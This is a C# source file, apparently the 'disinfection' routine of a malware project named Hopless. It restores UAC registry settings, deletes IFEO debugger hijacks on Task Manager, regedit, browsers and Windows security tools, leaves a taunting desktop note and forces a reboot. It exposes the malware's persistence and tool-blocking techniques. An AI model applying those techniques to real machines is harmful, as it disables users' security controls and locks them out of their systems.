using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace Hopless
{
    public class DesinfectionCore
    {
        public static async void Desinfection()
        {
            Program.infection = false;
            Registry.CurrentUser.DeleteSubKey(@"Software\Microsoft\NOHOPE");
            Regedit.RegistryLM(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 1);
            Regedit.RegistryLM(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "FilterAdministratorToken", 0);
            Regedit.RegistryLM(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", 2);
            IFEO();

            await Task.Delay(2000);
            var nl = Environment.NewLine;
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + "README_README_README.txt", "CONGRATULATIONS" + nl + nl + nl + nl + "YOU MANAGED TO RESTORE YOUR PC AND GO AGAINST ALL EXPECTATIONS." + nl + nl + nl + nl + "AFTER ALL, IT SEEMS LIKE THERE WAS HOPE FOR YOU..." + nl + nl + nl + nl + "SEE YOU SOON...");

            MessageBox.Show("Disinfection complete! Click OK to restart your computer. \n\n\n\n", "SUCESS", MessageBoxButtons.OK, MessageBoxIcon.Information);
            CmdPrompts.Start("cmd.exe", "/k shutdown /r /f /t 0");

        }

        static void IFEO()
        {
            string[] programs = { "msconfig.exe", "tasklist.exe", "taskmgr.exe", "mmc.exe", "explorer.exe", "regedit.exe", "chrome.exe", "msedge.exe", "iexplore.exe", "taskkill.exe", "cmd.exe",
            "SecurityHealthService.exe", "smartscreen.exe", "userinit.exe" };

            foreach (string program in programs)
            {
                try
                {
                    Regedit.DeleteKeyLM(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + program, "Debugger");
                }
                catch {}
                
            }
        }
    }
}
